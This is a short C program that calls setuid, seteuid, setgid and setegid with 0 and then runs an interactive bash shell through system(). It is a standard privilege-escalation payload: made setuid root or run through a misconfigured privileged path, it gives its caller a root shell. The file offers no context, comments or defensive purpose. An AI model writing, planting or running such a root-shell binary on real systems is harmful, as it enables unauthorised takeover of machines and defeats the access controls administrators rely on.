#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  setuid(0);
  seteuid(0);
  setgid(0);
  setegid(0);
  system("/bin/bash -i");
  return 0;
}
